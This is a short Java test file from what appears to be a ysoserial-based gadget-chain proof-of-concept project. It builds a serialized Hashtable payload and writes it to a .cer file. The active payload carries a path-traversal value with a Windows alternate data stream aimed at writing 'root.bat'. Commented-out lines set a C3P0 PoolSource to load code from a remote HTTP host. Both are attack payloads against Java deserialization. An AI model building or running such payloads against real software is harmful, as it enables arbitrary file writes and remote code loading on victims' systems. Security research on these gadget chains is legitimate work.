package ysoserial.test;

import java.io.*;
import java.util.Hashtable;


public class test {


    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
//        WrapperConnectionPoolDataSourceBase poolBackedDataSourceBase = new WrapperConnectionPoolDataSource(false);
//        Class cls = poolBackedDataSourceBase.getClass().getSuperclass();
//        Field field = cls.getDeclaredField("nestedDataSource");
//        field.setAccessible(true);
//        field.set(poolBackedDataSourceBase,new PoolSource("exp","http://192.168.2.1:8990/"));

//        Long long1 = new Long(100L);
//        Long long2 = new Long(100L);
        Hashtable hashtable = new Hashtable<>();
//        String[] dataItems = new String[]{"cxc1#cxc2#cxc3","cxc4#cxc5#cxc6"};
//        hashtable.put("dataItems",dataItems);
//        hashtable.put("endTS",long2);
        hashtable.put("parameter","cxc\\..\\..\\..\\root.bat::$DATA");



        ByteArrayOutputStream bOut=new ByteArrayOutputStream();
        //创建字节缓冲区
        ObjectOutputStream os=new ObjectOutputStream(bOut);
        os.writeObject(hashtable);

        FileOutputStream fileOutputStream = new FileOutputStream("/private/桌面文件/DSN/gadget_chain_Pocs-main/src/main/java/ysoserial/test/2.cer");
        fileOutputStream.write(bOut.toByteArray());
        os.close();
        bOut.close();

//                反序列化
//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("/private/桌面文件/DSN/gadget_chain_Pocs-main/src/main/java/ysoserial/test/2.cer"));
//        Hashtable x = (Hashtable) inputStream.readObject();
//        System.out.println("x");



    }
}